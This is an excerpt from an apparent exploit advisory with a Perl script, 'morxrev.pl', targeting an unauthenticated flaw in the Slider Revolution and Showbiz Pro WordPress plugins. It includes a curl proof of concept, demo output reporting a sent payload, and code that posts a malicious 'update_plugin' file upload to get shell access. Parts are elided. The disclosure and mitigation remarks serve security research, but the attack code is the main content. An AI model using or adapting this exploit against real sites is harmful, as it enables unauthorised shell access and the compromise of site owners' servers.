...
#
# About the plugins:
# The #1 Slider plugin, used by millions, slider revolution is an all-purpose slide displaying solution that allows for 
showing almost any
# kind of content whith highly customizable, transitions, effects and custom animations.
# Showbiz Pro is a responsive teaser displaying solution that allows you to show WordPress Posts or any Custom Content 
with a set
# amount of teaser items.
#
# Description:
# Slider Revolution and Showbiz Pro fail to check authentication in revslider_admin.php/showbiz_admin.php allowing an 
unauthenticated
...
# PoC on revslider:
# 1- Deleting a slider:
# root () host:/home/rootuser# curl -v --data 
...
# * Server Apache/2.4.6 (Unix) OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 is 
not blacklisted
...
# 
# Demo:
# perl morxrev.pl http://www.example.com revslider
# ===================================================
...
# [*] MorXploiting http://www.example.com
# [*] Sent payload
...
#
# Mitigation:
# Besides the recently LFI vulnerability that was published couple months ago, this is another vulnerability that 
revslider developers have 
# decided to patch without releasing a full security advisory, leaving thousands of revslider users who didn't update 
their plugin to the
# latest version (=> 3.0.96) vulnerable to this nasty flaw, revsliders developers will argue the fact that their slider 
comes with an
# auto-update feature, but the problem is that this plugin is bundled with a lot of themes, which means that those 
themes users may not get
# plugin updates or will have to pay to get the update. In other words revslider developers believe that every user 
should have the
# auto-update feature on, otherwise ... you are screwed.
# Obviously this is way more critical than the LFI vulnerability because it allows shell access giving attackers access 
...
# As for Showbiz Pro, sadly the vulnerability has never been patched as we successfully exploited it in the latest 
version (1.7.1).
#
# Author disclaimer:
...
print "perl $0 http://www.example.com revslider\n";
print "perl $0 http://www.example.com showbiz\n";
exit;
}
...
my $exploit = $ua->post("$host/$target", Cookie => "", Content_Type => "form-data", Content => [action => "$action", 
client_action => "update_plugin", update_file => ["$update_file"]]);
